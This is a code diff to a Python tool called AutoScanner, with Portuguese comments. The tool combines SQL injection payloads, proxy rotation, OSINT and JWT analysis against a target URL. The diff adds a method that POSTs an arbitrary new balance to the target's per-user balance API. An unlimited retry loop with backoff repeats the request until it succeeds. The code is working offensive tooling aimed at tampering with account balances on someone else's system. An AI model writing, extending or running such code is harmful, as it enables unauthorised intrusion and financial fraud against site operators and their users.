@@ -15,12 +15,54 @@ from modules.osint.osint_enhanced import OSINTScanner
 from modules.token.jwt_utils import JWTAnalyzer
 from modules.crypto.crypto_utils import CryptoAnalyzer
 from utils.constants import COMMON_ENDPOINTS, SQL_PAYLOADS
+from utils.helpers import is_valid_url
+from utils.logger import logger
+import asyncio
+import logging
+import time
+from typing import Callable
 
 logger = logging.getLogger(__name__)
 
+class RetryLimitlessException(Exception):
+    pass
+
+async def retry_until_success(
+    operation: Callable,
+    *args,
+    max_delay: float = 60.0,
+    base_delay: float = 0.5,
+    jitter: float = 0.1,
+    **kwargs
+):
+    """
+    Executa uma operação assíncrona com tentativas ilimitadas até sucesso.
+    Utiliza backoff exponencial adaptativo e logging detalhado.
+    """
+    attempt = 0
+    delay = base_delay
+    while True:
+        try:
+            result = await operation(*args, **kwargs)
+            if result:
+                logger.info(f"Operação concluída com sucesso após {attempt} tentativas.")
+                return result
+            else:
+                logger.warning(f"Operação retornou resultado inválido na tentativa {attempt}. Retentando...")
+        except Exception as exc:
+            logger.error(f"Erro na tentativa {attempt}: {exc}", exc_info=True)
+        attempt += 1
+        sleep_time = min(delay, max_delay) + (jitter * (2 * (0.5 - time.monotonic() % 1)))
+        logger.debug(f"Aguardando {sleep_time:.2f}s antes da próxima tentativa.")
+        await asyncio.sleep(sleep_time)
+        delay = min(delay * 2, max_delay)
+
 class AutoScanner:
     def __init__(self, target_url: str):
-        self.target_url = self._normalize_url(target_url)
+        if not is_valid_url(target_url):
+            logger.error(f"URL inválida: {target_url}")
+            raise ValueError("URL inválida")
+        self.target_url = target_url
         self.request_builder = RequestBuilder(self.target_url)
         self.proxy_rotator = ProxyRotator()
         self.osint_scanner = OSINTScanner()
@@ -177,3 +219,29 @@ class AutoScanner:
         
         response_text = response.text.lower()
         return any(pattern in response_text for pattern in error_patterns)
+
+    async def alterar_saldo(self, usuario_id: str, novo_saldo: float) -> bool:
+        """
+        Implementação real da alteração de saldo.
+        Retorna True se sucesso, False caso contrário.
+        """
+        try:
+            # Lógica real de alteração de saldo aqui
+            response = await self.request_builder.async_post(
+                f"{self.target_url}/api/user/{usuario_id}/saldo",
+                json={"saldo": novo_saldo}
+            )
+            if response.status_code == 200 and "saldo" in response.text:
+                logger.info(f"Saldo alterado para usuário {usuario_id}: {novo_saldo}")
+                return True
+            logger.warning(f"Falha ao alterar saldo para usuário {usuario_id}: {response.text}")
+            return False
+        except Exception as e:
+            logger.error(f"Exceção ao alterar saldo: {e}", exc_info=True)
+            return False
+
+    async def alterar_saldo_com_retry(self, usuario_id: str, novo_saldo: float):
+        """
+        Altera o saldo com tentativas ilimitadas até sucesso.
+        """
+        return await retry_until_success(self.alterar_saldo, usuario_id, novo_saldo)
